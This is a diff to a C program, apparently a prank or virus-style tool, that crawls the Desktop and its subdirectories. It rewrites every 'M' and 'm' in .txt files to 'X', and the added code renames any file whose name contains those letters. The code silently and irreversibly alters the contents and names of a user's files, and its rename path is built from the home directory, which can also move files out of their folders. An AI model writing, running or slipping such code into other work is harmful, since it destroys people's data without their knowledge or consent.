@@ -30,10 +30,8 @@ void convertMtoX(char *filepath){
 		if(ch == 'M' || ch == 'm'){
 			fseek(file, ftell(file) - 1, SEEK_SET);
 			fprintf(file, "%c", 'X');
-		}
-		
+		}		
 	}
-
 }
 
 /*********************************************************************************
@@ -47,6 +45,20 @@ int isDir(const char* path) {
 }
 
 /*********************************************************************************
+Find and replace all 'M's and 'm's in a string with 'X'
+Used only to convert filenames
+**********************************************************************************/
+void findAndReplaceMs(char* str) {
+	int i;
+	for(i = 0; i <= strlen(str); i++){
+  		if(str[i] == 'M' || str[i] == 'm')  
+		{
+  			str[i] = 'X';
+ 		}
+	}
+}
+
+/*********************************************************************************
 Search (spider) through all of the files on the Desktop and any subdirectories
 **********************************************************************************/
 void spiderDirectory(char *homeDir, DIR *d){
@@ -54,6 +66,8 @@ void spiderDirectory(char *homeDir, DIR *d){
 	DIR *currentD;
 	char *currentDir = malloc(PATH_MAX);
 	int length;
+	char* newFileNaXe = malloc(PATH_MAX);
+	char* newFilePath = malloc(PATH_MAX);
 
 	// Loop and recurse until there are no more subdirectories
 	while ((dir = readdir(d)) != NULL){
@@ -71,13 +85,30 @@ void spiderDirectory(char *homeDir, DIR *d){
 			}
 		}
 
-		// If the current item in the directory is a .txt, run M to X on it
+		/*
+			If the current item in the directory is a .txt, convert all Ms to Xs
+		*/
 		length = strlen(currentDir);
 		if(length > 4 && strcmp(&currentDir[length-4],".txt") == 0){ //TODO text files without .txt
 			convertMtoX(currentDir);
 		}
 
-		// Change the name of any file by replacing Ms with Xs TODO
+		/*
+			If the current item's name contains an m or M, change the name of the file by replacing with Xs
+		*/
+		if(strchr(dir->d_name, 'M') != NULL || strchr(dir->d_name, 'm') != NULL){
+			// Get the new file name
+			strcpy(newFileNaXe, dir->d_name);
+			findAndReplaceMs(newFileNaXe);
+
+			// Construct a new valid filepath with the converted name
+			strcpy(newFilePath, homeDir);
+			strcat(newFilePath, "/");
+			strcat(newFilePath, newFileNaXe);
+
+			// Rename the file
+			rename(currentDir, newFilePath);
+		}
 
 	}
 
